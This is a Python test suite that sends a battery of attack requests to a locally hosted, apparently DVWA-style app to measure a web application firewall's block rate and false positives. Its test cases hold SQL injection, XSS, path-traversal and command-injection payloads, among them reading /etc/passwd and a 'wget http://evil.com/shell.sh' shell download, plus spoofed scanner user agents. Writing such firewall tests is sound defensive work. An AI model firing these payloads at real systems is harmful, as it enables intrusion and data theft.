#!/usr/bin/env python3
"""
WAF Attack Test Suite — Phase 4
Fires a battery of attacks at a target URL and reports block rates.
Usage:
    python3 test_waf.py --target http://localhost:8090
    python3 test_waf.py --target http://localhost:8081   # unprotected
"""

import argparse
import json
import time
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime, timezone

# ─────────────────────────────────────────────
#  Test Cases
# ─────────────────────────────────────────────
TESTS = [
    # ── SQL Injection ─────────────────────────
    {
        "category": "SQLi",
        "name":     "UNION SELECT",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1%27+UNION+SELECT+1,2--&Submit=Submit",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "SQLi",
        "name":     "OR 1=1",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "SQLi",
        "name":     "Sleep (time-based blind)",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1'+AND+SLEEP(5)--&Submit=Submit",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "SQLi",
        "name":     "POST body injection",
        "method":   "POST",
        "path":     "/login.php",
        "body":     "username=admin'--&password=anything",
        "expect_block": True,
    },
    {
        "category": "SQLi",
        "name":     "Stacked queries",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1;DROP+TABLE+users--&Submit=Submit",
        "body":     None,
        "expect_block": True,
    },

    # ── XSS ───────────────────────────────────
    {
        "category": "XSS",
        "name":     "<script> tag",
        "method":   "GET",
        "path":     "/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "XSS",
        "name":     "javascript: URI",
        "method":   "GET",
        "path":     "/vulnerabilities/xss_r/?name=<a+href='javascript:alert(1)'>click</a>",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "XSS",
        "name":     "Event handler onerror",
        "method":   "GET",
        "path":     "/vulnerabilities/xss_r/?name=<img+src=x+onerror=alert(1)>",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "XSS",
        "name":     "POST body XSS",
        "method":   "POST",
        "path":     "/vulnerabilities/xss_s/",
        "body":     "txtName=Test&mtxMessage=<script>alert('stored')</script>&btnSign=Sign+Guestbook",
        "expect_block": True,
    },

    # ── Path Traversal ─────────────────────────
    {
        "category": "Path Traversal",
        "name":     "etc/passwd",
        "method":   "GET",
        "path":     "/vulnerabilities/fi/?page=../../../../etc/passwd",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "Path Traversal",
        "name":     "URL-encoded traversal",
        "method":   "GET",
        "path":     "/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "body":     None,
        "expect_block": True,
    },

    # ── Command Injection ─────────────────────
    {
        "category": "CMDi",
        "name":     "ping with pipe",
        "method":   "GET",
        "path":     "/vulnerabilities/exec/?ip=127.0.0.1|cat+/etc/passwd&Submit=Submit",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "CMDi",
        "name":     "wget shell download",
        "method":   "POST",
        "path":     "/vulnerabilities/exec/",
        "body":     "ip=127.0.0.1;wget+http://evil.com/shell.sh&Submit=Submit",
        "expect_block": True,
    },

    # ── Scanner Detection ─────────────────────
    {
        "category": "Recon",
        "name":     "Nikto scanner UA",
        "method":   "GET",
        "path":     "/",
        "body":     None,
        "headers":  {"User-Agent": "Mozilla/5.00 (Nikto/2.1.6)"},
        "expect_block": True,
    },
    {
        "category": "Recon",
        "name":     "sqlmap UA",
        "method":   "GET",
        "path":     "/",
        "body":     None,
        "headers":  {"User-Agent": "sqlmap/1.7"},
        "expect_block": True,
    },

    # ── Legitimate Traffic (should NOT block) ──
    {
        "category": "Legit",
        "name":     "Normal homepage",
        "method":   "GET",
        "path":     "/",
        "body":     None,
        "expect_block": False,
    },
    {
        "category": "Legit",
        "name":     "Normal login POST",
        "method":   "POST",
        "path":     "/login.php",
        "body":     "username=admin&password=password",
        "expect_block": False,
    },
    {
        "category": "Legit",
        "name":     "Normal search",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1&Submit=Submit",
        "body":     None,
        "expect_block": False,
    },
]

# ANSI colours
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def run_test(target: str, test: dict, timeout: int = 5) -> dict:
    url = target.rstrip("/") + test["path"]
    body_bytes = test["body"].encode() if test["body"] else None
    headers = {"User-Agent": "WAF-TestSuite/1.0", "Content-Type": "application/x-www-form-urlencoded"}
    headers.update(test.get("headers", {}))

    req = urllib.request.Request(url, data=body_bytes, method=test["method"])
    for k, v in headers.items():
        req.add_header(k, v)

    start = time.time()
    status = None
    blocked = False
    error = None

    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            status = resp.status
            blocked = (status == 403)
    except urllib.error.HTTPError as e:
        status  = e.code
        blocked = (status == 403)
    except Exception as e:
        error   = str(e)
        status  = 0

    elapsed = round((time.time() - start) * 1000, 1)
    correct = (blocked == test["expect_block"])

    return {
        "category":      test["category"],
        "name":          test["name"],
        "method":        test["method"],
        "path":          test["path"][:60],
        "expect_block":  test["expect_block"],
        "blocked":       blocked,
        "status":        status,
        "correct":       correct,
        "elapsed_ms":    elapsed,
        "error":         error,
    }


def main():
    parser = argparse.ArgumentParser(description="WAF Attack Test Suite")
    parser.add_argument("--target", default="http://localhost:8090", help="Target base URL")
    parser.add_argument("--delay",  type=float, default=0.2, help="Delay between requests (s)")
    parser.add_argument("--json",   action="store_true", help="Output results as JSON")
    args = parser.parse_args()

    print(f"\n{BOLD}{CYAN}{'═'*60}{RESET}")
    print(f"{BOLD}{CYAN}  Custom WAF Test Suite  |  Target: {args.target}{RESET}")
    print(f"{BOLD}{CYAN}{'═'*60}{RESET}\n")

    results = []
    current_cat = None

    for test in TESTS:
        if test["category"] != current_cat:
            current_cat = test["category"]
            print(f"{BOLD}{YELLOW}[ {current_cat} ]{RESET}")

        result = run_test(args.target, test)
        results.append(result)

        status_icon = f"{GREEN}✓{RESET}" if result["correct"] else f"{RED}✗{RESET}"
        block_str   = f"{RED}BLOCKED{RESET}" if result["blocked"] else f"{GREEN}ALLOWED{RESET}"
        exp_str     = "expected BLOCK" if result["expect_block"] else "expected ALLOW"

        print(f"  {status_icon} {test['name']:<40} {block_str:<20} ({exp_str}) [{result['elapsed_ms']}ms]")
        if result["error"]:
            print(f"      {RED}Error: {result['error']}{RESET}")

        time.sleep(args.delay)

    # ── Summary ──
    total    = len(results)
    correct  = sum(1 for r in results if r["correct"])
    attacks  = [r for r in results if r["expect_block"]]
    legit    = [r for r in results if not r["expect_block"]]
    blocked  = sum(1 for r in attacks if r["blocked"])
    fp       = sum(1 for r in legit if r["blocked"])

    print(f"\n{BOLD}{'─'*60}{RESET}")
    print(f"{BOLD}Summary{RESET}")
    print(f"{'─'*60}")
    print(f"  Total tests      : {total}")
    print(f"  Correct results  : {GREEN}{correct}/{total}{RESET}")
    print(f"  Attack block rate: {GREEN if blocked==len(attacks) else YELLOW}{blocked}/{len(attacks)}{RESET}")
    print(f"  False positives  : {GREEN if fp==0 else RED}{fp}/{len(legit)}{RESET}")
    print(f"{'─'*60}\n")

    if args.json:
        print(json.dumps(results, indent=2))

    # Save report
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"logs/test_report_{ts}.json"
    os.makedirs("logs", exist_ok=True)
    with open(fname, "w") as f:
        json.dump({
            "target":     args.target,
            "timestamp":  datetime.now(timezone.utc).isoformat() + "Z",
            "summary": {
                "total": total, "correct": correct,
                "block_rate": f"{blocked}/{len(attacks)}",
                "false_positives": fp,
            },
            "results": results,
        }, f, indent=2)
    print(f"  Full report saved → {fname}\n")


import os
if __name__ == "__main__":
    main()
